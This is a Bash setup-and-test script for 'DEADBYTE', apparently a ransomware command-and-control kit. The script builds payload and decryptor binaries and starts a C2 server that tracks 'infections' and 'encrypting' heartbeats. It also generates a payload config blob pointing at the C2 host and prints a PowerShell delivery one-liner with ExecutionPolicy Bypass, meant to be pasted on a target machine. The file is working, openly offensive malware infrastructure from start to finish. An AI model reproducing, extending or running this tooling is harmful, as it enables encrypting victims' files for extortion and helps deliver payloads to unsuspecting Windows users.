#!/usr/bin/env bash
# =====================================================================
# DEADBYTE - C2 setup + test suite in ONE command (Kali).
# Uso:  bash scripts/setup-kali.sh
#
# Optional variables (all with defaults):
#   C2_IP=192.0.2.10      advertised IP (default: detected IP)
#   PORT=8443                  C2 port
#   ADMIN_TOKEN=change-me-admin-token   token do painel/API
#   BEACON_TOKEN=change-me-beacon-token    token dos beacons
#   MASTER_SECRET=change-me-master-secret  master key secret
#   INTERVAL=30                intervalo de heartbeat (s)
#   FULL=1                     builds all 24 binaries (default: current OS only)
#   KEEP=1                     does not restart the C2 if it is already up
#   STOP=1                     stops the C2 at the end of the tests
#   DB=... LOG=... PIDF=...    alternative paths (tests/other OSes)
# =====================================================================
set -euo pipefail
cd "$(dirname "$0")/.."
ROOT="$(pwd)"
DIST="$ROOT/dist"

PORT="${PORT:-8443}"
ADMIN_TOKEN="${ADMIN_TOKEN:-change-me-admin-token}"
BEACON_TOKEN="${BEACON_TOKEN:-change-me-beacon-token}"
MASTER_SECRET="${MASTER_SECRET:-change-me-master-secret}"
INTERVAL="${INTERVAL:-30}"
DB="${DB:-$ROOT/deadbyte.db}"
LOG="${LOG:-$ROOT/c2.log}"
PIDF="${PIDF:-$ROOT/.c2.pid}"
PUBKEY_FILE="${PUBKEY_FILE:-$ROOT/.pubkey.txt}"

GOOS_L="$(go env GOOS 2>/dev/null || uname -s | tr 'A-Z' 'a-z')"
GOARCH_L="$(go env GOARCH 2>/dev/null || uname -m)"
case "$GOOS_L" in mingw*|msys*) GOOS_L=windows;; esac
case "$GOARCH_L" in x86_64|amd64) GOARCH_L=amd64;; aarch64|arm64) GOARCH_L=arm64;; esac
EXT=""; [ "$GOOS_L" = "windows" ] && EXT=".exe"
C2="$DIST/deadbyte-c2-$GOOS_L-$GOARCH_L$EXT"
PAY="$DIST/deadbyte-payload-$GOOS_L-$GOARCH_L$EXT"

DETECTED_IP="$(hostname -I 2>/dev/null | awk '{print $1}')" || true
C2_IP="${C2_IP:-$DETECTED_IP}"
[ -z "$C2_IP" ] && C2_IP="127.0.0.1"

FAILS=0
say(){ printf '\033[1;32m[+] %s\033[0m\n' "$*"; }
warn(){ printf '\033[1;33m[!] %s\033[0m\n' "$*"; }
die(){ printf '\033[1;31m[x] %s\033[0m\n' "$*"; exit 1; }
pass(){ printf '   \033[1;32mPASS\033[0m  %s\n' "$*"; }
failt(){ printf '   \033[1;31mFAIL\033[0m  %s\n' "$*"; FAILS=$((FAILS+1)); }
TMP="$(mktemp -d /tmp/dbtest.XXXXXX)"
cleanup(){
  if [ "${STOP:-0}" = "1" ] && [ -f "$PIDF" ]; then
    kill "$(cat "$PIDF")" 2>/dev/null || true; rm -f "$PIDF"; say "C2 encerrado (STOP=1)"
  fi
  rm -rf "$TMP" 2>/dev/null || true
}
trap cleanup EXIT

say "DEADBYTE SETUP // $(date '+%d/%m/%Y %H:%M')"
echo "   dir   : $ROOT"
echo "   target: $C2_IP:$PORT"
echo "   admin : $ADMIN_TOKEN"
echo "   beacon: $BEACON_TOKEN"

# ---- 1) Go ----------------------------------------------------------
if ! command -v go >/dev/null 2>&1; then
  warn "Go missing - installing golang-go..."
  sudo apt-get update -qq && sudo apt-get install -y -qq golang-go || die "instale o Go 1.24+ manualmente"
fi
say "Go $(go version | sed -E 's/.*go([0-9.]+).*/\1/')"

# ---- 2) binaries ----------------------------------------------------
if [ ! -x "$C2" ] || [ ! -x "$PAY" ]; then
  say "building binaries for $GOOS_L/$GOARCH_L"
  mkdir -p "$DIST"
  if [ "${FULL:-0}" = "1" ]; then
    ./scripts/build-all.sh
  else
    for b in payload decryptor c2 xorgen; do
      GOOS="$GOOS_L" GOARCH="$GOARCH_L" CGO_ENABLED=0 go build -trimpath -ldflags "-s -w" \
        -o "$DIST/deadbyte-$b-$GOOS_L-$GOARCH_L$EXT" "./cmd/$b"
    done
  fi
else
  say "binaries OK in dist/ ($GOOS_L/$GOARCH_L)"
fi

# ---- 3) C2 already running? ----------------------------------------------
stop_c2(){
  if [ -f "$PIDF" ]; then
    local old; old="$(cat "$PIDF")"
    kill "$old" 2>/dev/null && say "previous C2 stopped (pid $old)" || true
    rm -f "$PIDF"
  fi
  pkill -f "deadbyte-c2" 2>/dev/null && sleep 1 || true
}
if [ "${KEEP:-0}" != "1" ] && pgrep -f "deadbyte-c2" >/dev/null 2>&1; then
  warn "C2 already running - restarting with the current binaries (KEEP=1 preserves it)"
  stop_c2
fi

# ---- 4) master key -------------------------------------------------
if [ ! -f "$DB" ]; then
  say "generating master key (deadbyte.db)"
  "$C2" -listen "0.0.0.0:$PORT" -db "$DB" -admin-token "$ADMIN_TOKEN" \
        -beacon-token "$BEACON_TOKEN" -master-secret "$MASTER_SECRET" -gen 2>/dev/null | tee "$PUBKEY_FILE"
else
  say "existing deadbyte.db - keeping infections and master key"
fi

# ---- 5) start the C2 ---------------------------------------------------
if ! curl -sf "http://127.0.0.1:$PORT/api/v1/key/public" >/dev/null 2>&1; then
  say "starting C2 on 0.0.0.0:$PORT"
  nohup "$C2" -listen "0.0.0.0:$PORT" -db "$DB" -admin-token "$ADMIN_TOKEN" \
        -beacon-token "$BEACON_TOKEN" -master-secret "$MASTER_SECRET" \
        -beacon-interval "$INTERVAL" -dist "$DIST" -verbose >> "$LOG" 2>&1 &
  echo $! > "$PIDF"
  ok=0
  for _ in $(seq 1 15); do
    curl -sf "http://127.0.0.1:$PORT/api/v1/key/public" >/dev/null 2>&1 && { ok=1; break; }
    sleep 1
  done
  [ "$ok" = "1" ] || die "C2 did not answer - see $LOG"
fi
say "C2 up (pid $(cat "$PIDF" 2>/dev/null || echo '?'), log: $LOG)"
PUBKEY="$(curl -s "http://127.0.0.1:$PORT/api/v1/key/public" | sed -E 's/.*"public_key":"([^"]+)".*/\1/')" || true
[ -z "$PUBKEY" ] && PUBKEY="$(grep -oE '[A-Za-z0-9+/=]{40,}' "$PUBKEY_FILE" 2>/dev/null | head -1 || true)"

# ---- 6) firewall ------------------------------------------------------
if command -v ufw >/dev/null 2>&1; then
  if sudo -n true 2>/dev/null; then
    sudo -n ufw allow "$PORT/tcp" >/dev/null 2>&1 && say "firewall: $PORT/tcp open" \
      || warn "firewall: run 'sudo ufw allow $PORT/tcp'"
  else
    warn "firewall not verified (no sudo) - confirm $PORT/tcp is open"
  fi
fi

# ---- 7) test suite ---------------------------------------------
say "test suite (API + full flow)"
echo

R1="$(curl -s "http://127.0.0.1:$PORT/api/v1/key/public")" || true
case "$R1" in *public_key*) pass "GET /key/public            public key OK";; *) failt "GET /key/public: $R1";; esac

R2="$(curl -s -X POST "http://127.0.0.1:$PORT/api/v1/beacon" \
  -H "Content-Type: application/json" \
  -H "X-DeadByte-Token: $BEACON_TOKEN" \
  -d '{"hostname":"setup-probe","username":"kali","os":"linux","arch":"amd64","pid":1,"version":"1.1.0"}')"
VID="$(echo "$R2" | sed -E 's/.*"id":"([^"]+)".*/\1/')"
if [ -n "$VID" ]; then
  pass "POST /beacon              registered: $VID"
else
  failt "POST /beacon: $R2 (missing the X-DeadByte-Token header?)"
fi

if [ -n "$VID" ]; then
  R3="$(curl -s -X POST "http://127.0.0.1:$PORT/api/v1/heartbeat" \
    -H "Content-Type: application/json" \
    -H "X-DeadByte-Token: $BEACON_TOKEN" \
    -d "{\"id\":\"$VID\",\"phase\":\"encrypting\",\"files\":3,\"bytes\":1024,\"errors\":0}")"
  case "$R3" in *commands*) pass "POST /heartbeat            phase encrypting accepted";; *) failt "POST /heartbeat: $R3";; esac
fi

R4="$(curl -s "http://127.0.0.1:$PORT/api/v1/infections" -H "Authorization: Bearer $ADMIN_TOKEN")" || true
case "$R4" in *"$VID"*) pass "GET /infections            victim listed in the panel";; *) failt "GET /infections: $R4";; esac

R5="$(curl -s "http://127.0.0.1:$PORT/api/v1/events" -H "Authorization: Bearer $ADMIN_TOKEN")" || true
case "$R5" in *"new infection"*) pass "GET /events                global feed receiving events";; *) failt "GET /events: $R5";; esac

A1="$(curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:$PORT/artifacts/deadbyte-payload-windows-amd64.exe")" || true
[ "$A1" = "401" ] && pass "GET /artifacts without token   401 (protected)" || failt "GET /artifacts without token: $A1 (expected 401)"

A2="$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://127.0.0.1:$PORT/artifacts/deadbyte-payload-windows-amd64.exe")"
[ "$A2" = "200" ] && pass "GET /artifacts with token   200 (download OK)" || failt "GET /artifacts with token: $A2 (expected 200)"

echo "secret.txt" > "$TMP/secret.txt"
mkdir -p "$TMP/docs"
echo "data.csv" > "$TMP/docs/data.csv"
BLOB="$( "$PAY" -config-gen -c2 "http://$C2_IP:$PORT" -pubkey "$PUBKEY" \
  -token "$BEACON_TOKEN" -dirs "$TMP" -note-url "http://$C2_IP:$PORT" 2>/dev/null )" || true
if [ -n "$BLOB" ]; then
  pass "config-gen                blob generated (${#BLOB} chars)"
  if "$PAY" -config "$BLOB" -dry-run -force -verbose -log-file "$TMP/dry.log" > "$TMP/dry.out" 2>&1; then
    N="$(grep -c '^target' "$TMP/dry.out" 2>/dev/null || echo 0)"
    pass "payload -dry-run          exit 0 (targets in $TMP)"
  else
    failt "payload -dry-run: rc=$? - last log lines:"
    tail -3 "$TMP/dry.log" 2>/dev/null
  fi
else
  failt "config-gen produced no blob (valid pubkey? C2 up?)"
fi

echo
if [ "$FAILS" -gt 0 ]; then
  warn "$FAILS test(s) failed - see output above"
  exit 1
fi
say "ALL TESTS PASSED"

# ---- 7b) delivery pack with the REAL blob (no literal <BLOB>) ----------
if [ "${SKIP_DELIVERY:-0}" != "1" ] && [ "${STOP:-0}" != "1" ]; then
  say "generating delivery pack (real blob embedded)"
  C2_IP="$C2_IP" PORT="$PORT" ADMIN_TOKEN="$ADMIN_TOKEN" BEACON_TOKEN="$BEACON_TOKEN" \
    bash scripts/gen-delivery.sh all || warn "gen-delivery failed (is the C2 up?)"
  if [ -f "$ROOT/delivery/out/win-oneliner.txt" ]; then
    echo
    say "WINDOWS - paste into the target's PowerShell (regular user, NOT Admin):"
    echo "-----"
    cat "$ROOT/delivery/out/win-oneliner.txt"
    echo
    echo "-----"
    say "file: $ROOT/delivery/out/win.ps1"
  fi
fi

# ---- 8) summary --------------------------------------------------------
say "C2 ready."
echo
echo "   Interactive menu:  bash scripts/menu.sh"
echo
echo "   +--------------------------------------------------------------+"
echo "   | PAINEL   : http://$C2_IP:$PORT/  (token: $ADMIN_TOKEN) |"
echo "   | PUB KEY  : $PUBKEY |"
echo "   | BEACON   : token=$BEACON_TOKEN  intervalo=${INTERVAL}s          |"
echo "   | LOGS     : $LOG  (C2)                              |"
echo "   | STOP     : kill \$(cat $PIDF)                                  |"
echo "   +--------------------------------------------------------------+"
echo
echo "   Config blob (payload):"
echo "     $PAY -config-gen -c2 http://$C2_IP:$PORT -pubkey \"$PUBKEY\" \\"
echo "       -token $BEACON_TOKEN -note-url http://$C2_IP:$PORT"
echo
echo "   Windows delivery (PowerShell, on the target):"
echo "     powershell -ExecutionPolicy Bypass -File delivery/run.ps1 \\"
echo "       -C2Url http://$C2_IP:$PORT -Blob \"<BLOB>\""
echo
echo "   Manual beacon (quick test):"
echo "     curl -s -X POST http://$C2_IP:$PORT/api/v1/beacon \\"
echo "       -H \"Content-Type: application/json\" \\"
echo "       -H \"X-DeadByte-Token: $BEACON_TOKEN\" \\"
echo "       -d '{\"hostname\":\"test\",\"username\":\"kali\",\"os\":\"linux\",\"arch\":\"amd64\",\"pid\":1,\"version\":\"1.1.0\"}'"
echo
